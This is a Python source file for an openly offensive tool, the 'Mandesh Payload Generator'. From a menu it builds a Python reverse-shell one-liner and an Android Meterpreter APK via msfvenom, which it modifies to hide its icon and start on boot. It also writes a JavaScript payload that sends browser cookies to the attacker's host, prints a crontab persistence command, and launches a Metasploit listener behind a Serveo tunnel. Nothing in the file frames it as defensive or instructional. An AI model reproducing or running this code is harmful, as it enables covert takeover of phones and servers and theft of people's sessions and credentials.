import os
import socket
import subprocess
import time
import re
from colorama import Fore, Style

# Setup Directories
PAYLOAD_DIR = "mandesh_payloads"
if not os.path.exists(PAYLOAD_DIR):
    os.makedirs(PAYLOAD_DIR)

def get_ip():
    """Helper to find local IP for LHOST."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"

def check_tools():
    """Check for APK modification dependencies."""
    for tool in ["apktool", "jarsigner"]:
        if subprocess.run(f"command -v {tool}", shell=True, capture_output=True).returncode != 0:
            print(f"{Fore.RED}[!] Error: {tool} missing. Run: sudo apt install apktool default-jdk -y{Style.RESET_ALL}")
            return False
    return True

def stealth_modifier(apk_path):
    """Decompiles APK to hide icon and inject boot persistence."""
    print(f"{Fore.MAGENTA}[*] Ghost Mode: Injecting Persistence & Hiding Icon...{Style.RESET_ALL}")
    work_dir = f"{apk_path}_work"
    os.system(f"apktool d {apk_path} -o {work_dir} -f > /dev/null 2>&1")
    manifest_path = f"{work_dir}/AndroidManifest.xml"
    
    if os.path.exists(manifest_path):
        with open(manifest_path, 'r') as f:
            content = f.read()
        
        # Inject Boot Permission
        if 'RECEIVE_BOOT_COMPLETED' not in content:
            content = content.replace('</manifest>', '    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />\n</manifest>')
        
        # Hide Launcher Icon
        content = re.sub(r'<category android:name="android.intent.category.LAUNCHER"\s*/>', '', content)
        
        with open(manifest_path, 'w') as f:
            f.write(content)
        
        ghost_apk = apk_path.replace(".apk", "_ghost.apk")
        os.system(f"apktool b {work_dir} -o {ghost_apk} > /dev/null 2>&1")
        # Sign the APK so it can be installed
        os.system(f"jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore ~/.android/debug.keystore -storepass android {ghost_apk} androiddebugkey > /dev/null 2>&1")
        
        print(f"{Fore.GREEN}[+] Ghost APK created: {ghost_apk}{Style.RESET_ALL}")
        os.system(f"rm -rf {work_dir}")

def display_table():
    print(f"\n{Fore.YELLOW}Option | Payload Type        | Target System   | Function")
    print("-" * 85)
    print("A      | Reverse Shell       | Linux / Servers | Python terminal backconnect")
    print("B      | Android Meterpreter | Android Phones  | Create Ghost APK (Docker)")
    print("C      | Rubber Ducky (JS)   | Browsers        | Cookie/Credential Stealer")
    print("D      | Persistence Script  | System Boot     | Crontab reboot auto-start")
    print("E      | Listener            | Network         | MSF Multi-Handler + Serveo")
    print("F      | Compiler (EXE/ELF)  | Win / Linux     | PyInstaller Binary Creator")
    print("-" * 85 + Style.RESET_ALL)

def generate(choice, ip, port):
    ts = time.strftime("%H%M%S")
    use_serveo = input(f"{Fore.CYAN}Use Serveo Tunnel Alias? (y/n): {Style.RESET_ALL}").lower() == 'y'
    host = f"{input('Alias (e.g. mandesh-portal): ') or 'mandesh-portal'}.serveo.net" if use_serveo else ip
    lport = "80" if use_serveo else port

    if choice == 'A':
        payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{host}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        path = f"{PAYLOAD_DIR}/rev_{ts}.sh"
        with open(path, "w") as f: f.write(payload)
        print(f"{Fore.GREEN}[+] Saved to {path}{Style.RESET_ALL}")

    elif choice == 'B':
        ghost = input(f"{Fore.YELLOW}Enable Ghost Mode (Hide Icon)? (y/n): {Style.RESET_ALL}").lower() == 'y'
        apk_name = f"mandesh_{ts}.apk"
        full_path = os.path.join(PAYLOAD_DIR, apk_name)
        print(f"{Fore.BLUE}[*] Building APK via Docker...{Style.RESET_ALL}")
        os.system(f"sudo docker run --rm -v $(pwd)/{PAYLOAD_DIR}:/tmp metasploitframework/metasploit-framework ./msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={lport} -o /tmp/{apk_name}")
        os.system(f"sudo chown $USER:$USER {full_path}")
        if ghost and check_tools(): 
            stealth_modifier(full_path)

    elif choice == 'C':
        payload = f"fetch('http://{host}:{lport}/log?c=' + document.cookie);"
        path = f"{PAYLOAD_DIR}/ducky_{ts}.js"
        with open(path, "w") as f: f.write(payload)
        print(f"{Fore.GREEN}[+] JS Payload saved to {path}{Style.RESET_ALL}")

    elif choice == 'D':
        target = input("Script path to persist: ")
        print(f"{Fore.GREEN}[+] Add this to target crontab:\n(crontab -l ; echo \"@reboot python3 {os.path.abspath(target)} &\") | crontab -")

    elif choice == 'F':
        script = input("Script path to compile: ")
        os.system(f"pyinstaller --onefile {script}")
        print(f"{Fore.GREEN}[+] Check 'dist/' directory for binary.{Style.RESET_ALL}")

def main():
    os.system('clear')
    print(f"{Fore.RED}=== MANDESH PAYLOAD GENERATOR v1.2.2 ==={Style.RESET_ALL}")
    display_table()
    my_ip = get_ip()
    
    choice = input("\nSelect Option (A-F): ").upper()
    if choice in ['A', 'B', 'C', 'D', 'F']:
        ip = input(f"LHOST (Default {my_ip}): ") or my_ip
        port = input("LPORT: ")
        generate(choice, ip, port)
    elif choice == 'E':
        lport = input("Local Listen Port (e.g. 6060): ") or "6060"
        if input("Start Serveo Tunnel? (y/n): ").lower() == 'y':
            alias = input("Alias: ") or "mandesh-portal"
            subprocess.Popen(f"ssh -o StrictHostKeyChecking=no -R {alias}:80:localhost:{lport} serveo.net", shell=True)
            print(f"{Fore.GREEN}[+] Tunneling {alias}.serveo.net -> port {lport}{Style.RESET_ALL}")
        
        print(f"{Fore.BLUE}[*] Starting Metasploit Handler...{Style.RESET_ALL}")
        os.system(f"sudo docker run --rm -it -p {lport}:{lport} metasploitframework/metasploit-framework ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT {lport}; set ExitOnSession false; exploit'")

if __name__ == "__main__":
    main()
